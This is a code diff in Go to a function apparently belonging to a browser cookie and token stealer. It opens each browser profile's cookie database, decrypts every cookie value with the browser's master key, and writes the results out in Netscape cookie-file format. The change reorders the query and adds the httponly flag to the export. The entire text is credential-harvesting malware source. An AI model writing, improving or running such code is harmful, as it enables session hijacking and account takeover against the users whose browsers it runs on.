@@ -27,7 +27,7 @@ func GetTokensAuto(browsersList []structs.Browser) {
 			}
 			defer db.Close()
 
-			row, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
+			row, err := db.Query("SELECT host_key, path, is_httponly, expires_utc, name, encrypted_value FROM cookies")
 			if err != nil {
 				continue
 			}
@@ -35,24 +35,25 @@ func GetTokensAuto(browsersList []structs.Browser) {
 
 			for row.Next() {
 				var host_key string
-				var name string
-				var path_this string
-				var encrypted_value []byte
+				var path string
+				var is_httponly string
 				var expires_utc string
-				row.Scan(&host_key, &name, &path_this, &encrypted_value, &expires_utc)
+				var name string
+				var encrypted_value []byte
+				row.Scan(&host_key, &path, &is_httponly, &expires_utc, &name, &encrypted_value)
 				decrypted, err := decryption.DecryptPassword(encrypted_value, master_key)
 				if err != nil {
 					decrypted = string(encrypted_value)
 				}
-				expired := "TRUE"
-				if expires_utc == "0" {
-					expired = "FALSE"
+				httpfrfr := "TRUE"
+				if is_httponly == "0" {
+					httpfrfr = "FALSE"
 				}
 				tf_other := "TRUE"
 				if host_key[0] == '.' {
 					tf_other = "FALSE"
 				}
-				cookiesFound = cookiesFound + host_key + "\t" + tf_other + "\t" + path_this + "\t" + name + "\t" + decrypted + "\t" + expired + "\n"
+				cookiesFound = cookiesFound + host_key + "\t" + tf_other + "\t" + path + "\t" + httpfrfr + "\t" + expires_utc + "\t" + name + "\t" + decrypted + "\n"
 			}
 		}
 		cookies = append(cookies, CookiesOutput{browser.ProfilePath, cookiesFound})
